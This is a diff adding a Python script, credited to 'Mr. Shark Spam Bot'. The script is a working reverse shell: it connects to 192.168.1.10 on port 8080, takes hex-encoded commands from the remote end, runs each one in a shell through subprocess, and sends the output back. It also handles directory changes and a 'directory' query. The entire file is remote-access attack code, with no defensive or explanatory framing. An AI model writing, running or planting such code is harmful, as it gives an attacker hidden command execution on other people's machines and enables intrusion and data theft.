@@ -1,0 +1,59 @@
+# -*- coding: utf-8 -*-
+"""
+Created on Sat Mar 27 12:04:59 2021
+
+@author: Mr. Shark Spam Bot
+"""
+import socket
+import subprocess
+import os
+import codecs
+import json
+
+def hex_handler(text, encode=False, decode=False):
+    '''Encode or decode text using hex.'''
+    if encode is True:
+        new_text = text.encode()
+        new_text = codecs.encode(new_text, encoding='hex')
+        new_text = new_text.decode()
+        new_text = json.dumps(new_text)
+        new_text = new_text.encode()
+    if decode is True:
+        new_text = json.loads(text)
+        new_text = new_text.encode()
+        new_text = codecs.decode(new_text, encoding='hex')
+        new_text = new_text.decode()
+    return new_text
+
+rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+rev_socket.connect(('192.168.1.10', 8080))
+
+while True:
+    command = hex_handler(rev_socket.recv(1024), decode=True)
+
+    if command == 'exit':
+        rev_socket.close()
+        break
+
+    if command == 'directory':
+        rev_socket.send(hex_handler(os.getcwd(), encode=True))
+        continue
+
+    output = subprocess.Popen(command, shell=True, stdout = subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout = output.stdout.read().decode()
+    if stdout:
+        rev_socket.send(hex_handler(stdout, encode=True))
+        continue
+    stderr = output.stderr.read().decode()
+    if stderr:
+        rev_socket.send(hex_handler(stderr, encode=True))
+        continue
+
+    if command.startswith('cd') and len(command.split()) >= 2:
+        try:
+            os.chdir(command[3:])
+        except IOError:
+            rev_socket.send(hex_handler('The system cannot find path specified.', encode=True))
+            continue
+
+    rev_socket.send(hex_handler('\n', encode=True))
